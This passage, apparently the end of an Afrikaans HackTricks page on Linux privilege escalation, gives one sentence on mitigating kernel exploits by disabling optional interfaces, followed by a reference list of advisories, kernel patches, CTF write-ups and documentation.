Hierdie soort versagting is ook die moeite werd om vir ander kernel-LPE's te onthou: as uitbuiting van 'n spesifieke opsionele koppelvlak afhang, kan die deaktivering of swartlys daarvan die exploit-pad breek, selfs voordat 'n volledige kernel-opgradering beskikbaar is.<sup>[[6]](#references)[[28]](#references)</sup>



{{#include ../../banners/hacktricks-training.md}}

## References

- [1] [HTB Bamboo – kaping van 'n script wat as root uitgevoer word in 'n PaperCut-gids wat deur gebruikers beskryfbaar is](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Openwall oss-security-openbaarmaking vir CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Linux stable-regstelling: crypto: algif_aead - keer terug na werking buite plek](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — CVE-2026-31431-advies](https://copy.fail/)
- [7] [Theori / Xint-tegniese uiteensetting](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [DirtyClone-bewaarplek / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: Ontleding en uitbuiting van die Linux LPE-variant DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Linux-regstelling: net: skb: behou `SKBFL_SHARED_FRAG` in `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Vroeëre Linux-versagting: stel `SKBFL_SHARED_FRAG` vir UDP-pakkette met splice in (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — Linux-manualblad](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — Linux-manualblad](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — Debian-manualblad](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — Linux-kerneldokumentasie](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [MIME-toepassingsassosiasies](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Gedeelde MIME-inligting-spesifikasie](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Desktop Entry-spesifikasie](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Kconfig-taal](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Linux crypto Makefile](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: Linux-kernel AF_ALG-kwesbaarheid in die bladsykas](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — Linux-manualblad](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf — HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Git `hash-object`-dokumentasie](https://git-scm.com/docs/git-hash-object)
- [32] [Git `ls-tree`-dokumentasie](https://git-scm.com/docs/git-ls-tree)
- [33] [Git-konfigurasiedokumentasie](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)` — Linux-manualblad](https://man7.org/linux/man-pages/man2/openat2.2.html)
- [35] [systemd generator-dokumentasie](https://github.com/systemd/systemd/blob/main/man/systemd.generator.xml)
- [36] [Elastic Security Labs — Linux Detection Engineering: volhardingsmeganismes](https://www.elastic.co/security-labs/threat-command/primer-on-persistence-mechanisms)
- [37] [0xdf — HTB: MakeSense](https://0xdf.gitlab.io/2026/10/31/htb-makesense.html)
